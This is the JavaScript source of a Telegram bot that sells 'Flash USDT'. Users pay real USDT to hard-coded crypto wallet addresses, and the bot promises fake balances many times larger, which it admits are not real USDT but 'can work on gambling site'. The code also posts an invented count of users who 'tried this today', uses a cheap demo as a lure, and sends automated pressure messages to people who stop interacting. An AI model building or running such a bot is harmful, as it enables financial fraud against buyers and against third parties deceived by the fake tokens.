const TelegramBot = require('node-telegram-bot-api');
const mongoose = require("mongoose");

const token = process.env.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const ADMIN_ID = 7577278314;

const addresses = {
  BEP20: "0x7fc952f9c38facc2a46fe1d863267d01dda7276d",
  TRC20: "TVCvtgXAjuHGkJQ6FK5sLMDCuA72MLdz3n",
  TON: "UQCk6ZT-Xmi8-Hk2JyEUXhM8j1n0ufxp-UmXZ_F1OKhLLjqy"
};

// ===== MONGODB SETUP =====
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => console.log("❌ MongoDB Error:", err));

const userSchema = new mongoose.Schema({
  chatId: { type: String, unique: true },
  username: String,
  name: String,
  step: String,
  method: String,
  amount: Number,
  details: String,
  orderId: Number,
  isDemo: Boolean,
  demoUsed: Boolean,
  replyTo: String,

  // 🔥 TRACKING (ADD THIS)
  clickedDemo: { type: Boolean, default: false },
  lastInteraction: { type: Date, default: Date.now },
  followUpSent: { type: Boolean, default: false }
});

const orderSchema = new mongoose.Schema({
  orderId: Number,
  processed: Boolean
});

const User = mongoose.model("User", userSchema);
const Order = mongoose.model("Order", orderSchema);

// ===== HELPERS =====
async function getUser(chatId, username = "NoUsername", name = "User") {
  const user = await User.findOneAndUpdate(
    { chatId },
    { $setOnInsert: { username, name, demoUsed: false } },
    { new: true, upsert: true }
  );
  return user;
}

function getBalance(amount) {
  if (amount >= 100) return "$6000";
  if (amount >= 50) return "$3200";
  if (amount >= 30) return "$1400";
  if (amount >= 20) return "$800";
  if (amount >= 2) return "$20";
  return null;
}

// ---------------- START MENU ----------------
async function showMainMenu(chatId) {
  const user = await getUser(chatId);
  user.step = null;
  await user.save();

  bot.sendMessage(chatId,
`💎 Welcome to USDTExpress

Buy Flash USDT (Demo Available)

⚠️ This is NOT real USDT  
‼️ Can work on gambling site
🚫 Not supported on exchanges  

💰 Minimum Order: $20  
🎀 Network: BEP20  

🎁 Demo available in Support  

🔥 81 users tried this today  

👇 Choose an option below:`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "💰 Buy Flash USDT", callback_data: "buy" }],
          [{ text: "📊 Price List", callback_data: "price" }],
          [{ text: "📩 Support", callback_data: "support" }]
        ]
      }
    }
  );
}

bot.onText(/\/start/, async (msg) => {
  await showMainMenu(msg.chat.id);
});

// ---------------- CALLBACK ----------------
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const username = query.from.username ? `@${query.from.username}` : "NoUsername";
  const name = query.from.first_name || "User";

  const user = await getUser(chatId, username, name);

  if (data === "buy") {
    user.isDemo = false;
    await user.save();

    bot.editMessageText(
`💳 Choose Payment Method
Send $20 or more:`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "♦️ BEP20", callback_data: "pay_BEP20" }],
            [{ text: "🔺 TRC20", callback_data: "pay_TRC20" }],
            [{ text: "🔷 TON", callback_data: "pay_TON" }],
            [{ text: "🔙 Back", callback_data: "back" }]
          ]
        }
      }
    );
  } else if (data === "price") {
    bot.editMessageText(
`💎 Flash USDT Price List
💵 $20 Real USDT → $800 Flash Balance
💵 $30 Real USDT → $1400 Flash Balance
💵 $50 Real USDT → $3200 Flash Balance
💵 $100 Real USDT → $6000 Flash Balance

⚡ Many people go for $3200 Flash`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "💰 Buy Now", callback_data: "buy" }],
            [{ text: "🔙 Back", callback_data: "back" }]
          ]
        }
      }
    );
  } else if (data === "support") {
    bot.editMessageText(
`📩 Support Center
Choose option:`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎁 Demo", callback_data: "demo" }],
            [{ text: "📩 Need Help", callback_data: "need_help" }],
            [{ text: "🔙 Back", callback_data: "back" }]
          ]
        }
      }
    );
  } else if (data === "demo") {
  if (user.demoUsed) return bot.answerCallbackQuery(query.id, { text: "❌ Demo already used" });

  // 🔥 TRACK INTEREST
  user.clickedDemo = true;
  user.lastInteraction = new Date();

  user.isDemo = true;
  await user.save();

    bot.editMessageText(
`🎁 Demo Plan >> Once per user
💰 Pay $2 Real USDT → Get $20 Flash

Choose payment method:`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "♦️ BEP20", callback_data: "pay_BEP20" }],
            [{ text: "🔺 TRC20", callback_data: "pay_TRC20" }],
            [{ text: "🔷 TON", callback_data: "pay_TON" }],
            [{ text: "🔙 Back", callback_data: "back" }]
          ]
        }
      }
    );
  } else if (data === "need_help") {
    user.step = "support";
    await user.save();
    bot.sendMessage(chatId,
`📩 Support Chat

Send your message here and our admin will reply to you inside the bot.

Type your question or issue now:`
    );
  } else if (data.startsWith("pay_")) {
    const method = data.split("_")[1];
    user.method = method;
    await user.save();
    let amountText = user.isDemo ? "$2" : "$20+";

    bot.editMessageText(                                   `${method} Payment                                         Send ${amountText} to:                                     \`${addresses[method]}\`                                   
After payment click below:`,
      {
        parse_mode: "Markdown",
        chat_id: chatId,                                           message_id: query.message.message_id,
        reply_markup: {                                              inline_keyboard: [                                           [{ text: "✅ I PAID", callback_data: "paid" }],
            [{ text: "🔙 Back", callback_data: "back" }]
          ]
        }
      }
    );
  } else if (data === "paid") {
    user.step = "details";
    await user.save();
    bot.sendMessage(chatId,
`📩 Send TX# & receiving address:

TXID  - 0x2d3d7abb690bbc65a45cea897667a3bea80bd55bd309517e189b7458bab74d03
BEP20 - 0x8f3a0000000000000000000000000000000000a1

Make sure address belongs to wallet.
Trust Wallet or Binance Web3.`
    );
  } else if (data === "back") {
    await showMainMenu(chatId);
  } else if (data.startsWith("approve_") || data.startsWith("reject_") || data.startsWith("reply_")) {
    // Keep original logic
    const orderIdOrUser = data.split("_")[1];

    if (data.startsWith("approve_")) {
      const orderId = Number(orderIdOrUser);
      const order = await Order.findOne({ orderId });
      if (order && order.processed) {
        const targetUser = await User.findOne({ orderId });
        const balance = getBalance(targetUser.amount);
        bot.sendMessage(targetUser.chatId, `🎉 Completed\n\n 💰 Balance: ${balance}`);
        return bot.answerCallbackQuery(query.id, { text: "Already processed" });
      }
      const targetUser = await User.findOne({ orderId });
      if (!targetUser) return;
      await Order.create({ orderId, processed: true });
      const balance = getBalance(targetUser.amount);
      bot.sendMessage(targetUser.chatId, `🎉 Completed\n\n💰 Balance: ${balance}`);
      if (targetUser.isDemo) {
        targetUser.demoUsed = true;
        await targetUser.save();
      }
      bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: query.message.message_id
      });
      bot.answerCallbackQuery(query.id, { text: "Approved" });
    } else if (data.startsWith("reject_")) {
      const orderId = Number(orderIdOrUser);
      const order = await Order.findOne({ orderId });
      if (order && order.processed) {
        const targetUser = await User.findOne({ orderId });
        bot.sendMessage(targetUser.chatId, "❌ Payment not found. If you believe it's a mistake, reach out to support");
        return bot.answerCallbackQuery(query.id, { text: "Already processed" });
      }
      await Order.create({ orderId, processed: true });
      const targetUser = await User.findOne({ orderId });
      if (targetUser) bot.sendMessage(targetUser.chatId, "❌ Payment not found. If you believe it's a mistake, reach out to support");
      bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: query.message.message_id
      });
      bot.answerCallbackQuery(query.id);
    } else if (data.startsWith("reply_")) {
      const userId = orderIdOrUser;
      user.replyTo = userId;
      user.step = "admin_reply";
      await user.save();
      bot.sendMessage(chatId, "✍️ Send reply message:");
    }
  }
});

// ---------------- MESSAGE ----------------
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const username = msg.from.username ? `@${msg.from.username}` : "NoUsername";
  const name = msg.from.first_name || "User";

  const user = await getUser(chatId, username, name);
// 🔥 TRACK USER ACTIVITY
user.lastInteraction = new Date();
await user.save();
  
  if (user.step === "admin_reply") {
    const targetId = user.replyTo;
    bot.sendMessage(targetId, `📩 Admin Reply:\n\n${text}`);
    bot.sendMessage(chatId, "✅ Reply sent");
    user.step = null;
    await user.save();
    return;
  }

  if (user.step === "support") {
    bot.sendMessage(ADMIN_ID,
`Support from ${chatId} (${name} ${username}):
${text}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Reply", callback_data: `reply_${chatId}` }]
          ]
        }
      }
    );
    bot.sendMessage(chatId, "✅ Sent to admin");
    user.step = null;
    await user.save();
    return;
  }

  if (user.step === "details") {
    user.details = text;
    user.step = "amount";
    await user.save();
    bot.sendMessage(chatId, "💰 Enter amount sent:");
    return;
  }

  if (user.step === "amount") {
    const amount = parseInt(text);
    if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, "❌ Please enter a valid number");
    if (user.isDemo && amount < 2) return bot.sendMessage(chatId, "❌ Minimum $2 for demo");
    if (!user.isDemo && amount < 20) return bot.sendMessage(chatId, "❌ Minimum $20");

    user.amount = amount;
    user.orderId = Date.now() + Math.floor(Math.random() * 1000);
    user.step = null;
    await user.save();

    bot.sendMessage(chatId,
`⏳ Processing your request...

Due to high demand, processing may take some time.
You’ll be notified once it’s completed.

Thanks for your patience 🙌`
    );

    bot.sendMessage(ADMIN_ID,
`New Order
User: ${chatId} (${name} ${username})
Amount: $${amount}
Method: ${user.method}
${user.details}`,
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Approve", callback_data: `approve_${user.orderId}` },
              { text: "Reject", callback_data: `reject_${user.orderId}` }
            ]
          ]
        }
      }
    );
  }
});

// ---------------- BROADCAST ----------------
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
  if (msg.chat.id != ADMIN_ID) return;
  const text = match[1];
  const usersList = await User.find();
  for (let u of usersList) {
    bot.sendMessage(u.chatId, `📢 ${text}`).catch(() => {});
  }
  bot.sendMessage(ADMIN_ID, "✅ Broadcast sent");
});

// ===== 🔥 SMART FOLLOW-UP SYSTEM =====
setInterval(async () => {
  try {
    const inactiveUsers = await User.find({
      clickedDemo: false,
      followUpSent: false,
      lastInteraction: { $lt: new Date(Date.now() - 15 * 60 * 1000) }
    });

    for (let u of inactiveUsers) {
      await bot.sendMessage(u.chatId,
`⏳ You checked it… but didn’t try.

Most people stop here.

Few actually test and understand it 👀

🎁 Demo still open (limited)

👉 /start`
      ).catch(() => {});

      u.followUpSent = true;
      await u.save();
    }

  } catch (err) {
    console.log("❌ Follow-up error:", err);
  }
}, 5 * 60 * 1000);
